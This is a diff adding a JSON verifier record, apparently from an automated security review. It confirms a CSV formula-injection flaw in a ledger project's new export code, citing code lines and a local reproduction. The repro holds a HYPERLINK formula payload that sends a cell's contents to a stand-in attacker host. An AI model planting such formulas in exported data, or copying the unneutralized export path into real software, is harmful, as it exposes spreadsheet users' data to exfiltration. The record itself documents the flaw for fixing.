@@ -1,0 +1,76 @@
+{
+  "accounted": {
+    "candidates": [
+      "export/csv-formula-injection"
+    ],
+    "premises": []
+  },
+  "format": "verifier-accounting/2",
+  "manifest_sha256": "54335a4688c203173c687b4b62d9603f088c1be8f77acace683b2872dfc17ab3",
+  "raw_return": "/tmp/rcs-savings/baseline/publishable/work/private/verify-initial/raw-return.json",
+  "raw_return_sha256": "f0f75a503a290a931f68d1ae001de5c72dfc89c23f1abfd73bb4ef6187217f99",
+  "return": {
+    "candidates": [
+      {
+        "basis": "ledger/export.py is a wholly new file in this head commit (base commit 2301c83 has no export.py and cli.py had no --format/CSV path at all), and its statement_csv writes each entry's user-supplied description verbatim into a CSV cell via csv.writer with no neutralization of leading =, +, -, @, tab, or CR; Ledger.post (ledger/accounts.py) accepts descriptions as unrestricted strings, and a direct repro confirms a description of '=HYPERLINK(\"http://attacker.example/?\"&A1,\"x\")' is emitted unmodified into the exported CSV, which the PR body identifies accountants as opening in a spreadsheet.",
+        "corrections": {},
+        "evidence": [
+          {
+            "coordinate": "ledger/export.py:18",
+            "text": "writer.writerows(statement_rows(account))"
+          },
+          {
+            "coordinate": "ledger/statement.py:20",
+            "text": "rows.append((entry.day.isoformat(), entry.description, format_cents(entry.amount), format_cents(running)))"
+          },
+          {
+            "coordinate": "ledger/accounts.py:58",
+            "text": "entry = Entry(day, description, amount)"
+          },
+          {
+            "coordinate": "ledger/accounts.py:15",
+            "text": "description: str"
+          },
+          {
+            "coordinate": "issue-3/pr-body",
+            "text": "accountants want to open them in a spreadsheet"
+          },
+          {
+            "coordinate": "local-repro/statement_csv output",
+            "text": "2026-09-02,\"=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"x\"\")\",-4.50,95.50"
+          }
+        ],
+        "id": "export/csv-formula-injection",
+        "safety_rulings": [
+          {
+            "conditions": "description begins with a formula-trigger character such as '='",
+            "evidence": [
+              {
+                "coordinate": "ledger/export.py:16-18",
+                "text": "writer = csv.writer(out, lineterminator=\"\\n\"); writer.writerow(HEADER); writer.writerows(statement_rows(account))"
+              },
+              {
+                "coordinate": "local-repro/statement_csv output",
+                "text": "\"=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"x\"\")\" written verbatim, only comma/quote-escaped, leading '=' intact"
+              }
+            ],
+            "path": "ledger/export.py:13-19",
+            "premise": "csv.writer neutralizes or blocks formula-trigger leading characters before writing a field",
+            "ruling": "fails"
+          }
+        ],
+        "verdict": "confirmed"
+      }
+    ],
+    "duplicate_groups": [],
+    "manifest_sha256": "54335a4688c203173c687b4b62d9603f088c1be8f77acace683b2872dfc17ab3",
+    "observation": null,
+    "premises": []
+  },
+  "structurally_complete": true,
+  "violations": [],
+  "withheld": {
+    "candidates": [],
+    "premises": []
+  }
+}
